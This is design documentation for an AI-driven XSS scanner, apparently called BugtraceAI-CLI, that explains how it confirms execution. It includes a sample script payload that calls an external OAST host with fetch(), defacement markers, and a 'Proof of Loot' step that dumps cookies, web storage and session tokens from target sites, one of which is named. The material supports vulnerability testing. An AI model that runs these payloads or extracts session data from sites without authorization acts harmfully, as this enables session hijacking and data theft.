# BugtraceAI-CLI: Validation System

## Evolutionary Strategy: From Reflection to Execution

---

## 🎯 The Philosophy: Proof of Execution (PoE)

The core goal of the validation system is to eliminate **False Positives (FPs)**. In early versions, we relied on simple reflection (seeing the payload in the HTML). However, real-world sanitization can reflect a payload *without executing it*.

### ❌ The Old Problem: String-Based False Positives

Even the "BUGTRACE" marker approach was vulnerable to FPs if the site simply reflected the string `<div ...>BUGTRACE...</div>` as sanitized text. The vision model or a simple DOM search might see the text and report it as validated, while the JavaScript never actually ran.

### ✅ The New Solution: Strict PoE Markers

Validation now requires **Proof of Execution**. This means the JS payload must *do something* that only executing code can do:

1. **Interactsh Callback**: Send an Out-of-Band (OOB) request to our server.
2. **JS-Created DOM Marker**: Use `document.createElement` to inject a unique element that was NOT in the initial response.

---

## 🚀 The Multi-Layered Validation Flow

The system orchestrates three layers of validation to ensure 100% fidelity.

```mermaid
graph TD
    A[Payload Injected] --> B{Layer 1: Interactsh OOB}
    B -->|Callback Received| C[✅ EXPLOIT CONFIRMED]
    B -->|No Callback| D{Layer 2: CDP Marker Detection}
    
    D -->|Unique Marker found in DOM| C
    D -->|Marker missing| E{Layer 3: Vision Fallback}
    
    E -->|Vision confirms execution| C
    E -->|Vision sees rejection| F[❌ REJECTED - FALSE POSITIVE]
```



### 1. Interactsh OOB (Primary)

The most reliable method. The payload includes a unique URL. If the `InteractshClient` receives a hit from the target IP, the XSS is confirmed.

### 2. CDP Marker Detection (Secondary)

The agent search for a specific `id` (e.g., `BTPOE_abcd`) using Chrome DevTools Protocol. This ID is generated dynamically and injected via `document.createElement`. If it exists in the DOM, the JS *must* have executed.

### 3. Vision Analysis (Fallback)

Used when OOB is blocked (e.g., CSP) and markers are obscured. The vision model analyzes screenshots for visual artifacts of execution (popups, injected content) based on strict prompts.

---

## 📋 Prompt Reference & Marker Logic

| Method | Verification Target | Strength |
| :--- | :--- | :--- |
| **Interactsh** | DNS/HTTP/HTTPS Callback | **Absolute** |
| **CDP** | `id` of dynamic DOM element created by JS | **High** |
| **Vision** | Visual popups, red-banner execution indicators | **Medium** |

### Implementation Detail: The Marker Payload

A typical PoE payload used by the agent:

```html
<script>
  let m=document.createElement('div');
  m.id='BTPOE_param';
  document.body.appendChild(m);
  fetch('https://xss_param.abc123.oast.fun');
</script>
```

The `XSSVerifier` specifically looks for `document.getElementById('BTPOE_param')` rather than just searching the page text.

---

---

## 🛠️ Validation Reliability Improvements (v2.2.0)

### 1. Browser Dialog (Alert) Detection

In sites where DOM manipulation is complex or CSP is restrictive, the most reliable proof of execution is the native `window.alert`, `confirm`, or `prompt`.

- **Implementation**: The `XSSVerifier` now monitors the `dialog` event in Playwright.
- **Confirmation**: If a dialog is triggered during navigation, `dialog_detected` is set to `True`, which constitutes a **Level 1 Proof of Execution**.

## 3. Validation Logic

### 3.1. Browser-Based Validation (Playwright)

The core validation engine uses Playwright to launch a headless browser and confirm execution.

**Detection Mechanisms:**

1. **Dialog Interception:** Detects `alert()`, `confirm()`, `prompt()` dialogs.
2. **Visual Defacement (V4):** Checks for the presence of the string **"HACKED BY BUGTRACEAI"** in the DOM. This is the preferred method for generating proof-of-concept screenshots.
3. **CSTI Evaluation:** Verifies if mathematical expressions (e.g., `{{7*7}}`) evaluate to their result (`49`) rendered in the text.
4. **Click Simulation (V4):** If no immediate XSS is detected, the validator searches for interactive elements (links, buttons) and simulates clicks to trigger dormant DOM XSS (e.g., `javascript:` links).

### 3.2. Out-of-Band (OOB) Validation (Interactsh)

The most reliable confirmation for Blind XSS or when the browser events are suppressed. A callback to our OOB server is undeniable proof of execution.

### 3.3. Proof of Impact (Proof of Loot) - v2.3.0 (2026-01-13)

Confirmed execution is only half the battle. To provide professional-grade value, BugTraceAI now extracts **Proof of Impact** immediately upon confirmation:

1. **Session Artifacts**: Extraction of `document.cookie` (non-HttpOnly).
2. **Web Storage**: Dumping keys from `localStorage` and `sessionStorage`.
3. **Context Identity**: Capturing `window.origin` and sensitive tokens.
4. **Security Impact**: Identifying if session hijacking is possible via the extracted data.

This data is attached to the finding as `impact_data` and included in the professional report to provide a clear business risk assessment.

### 2. Adaptive Timeouts for Dynamic Sites

Legacy validation used a fixed 5s timeout. High-latency or script-heavy sites (like `andorracampers.com`) often take >10s to execute reflected payloads.

- **Correction**: Default validation timeout increased to **15.0 seconds**.
- **Impact**: Dramatic reduction in false negatives on slow sites.

### 3. Integrated Secondary Validation (`_validate_secondary`)

A new unified method that attempts:

1. **CDP/Playwright Dialog Detection**: Real-time monitoring of browser events.
2. **DOM Marker Search**: Searching for JS-created POE elements.
3. **Vision Analysis**: Fallback analysis of the final state.

---

Last Updated: 2026-01-13 | Phoenix Edition v2.3.0
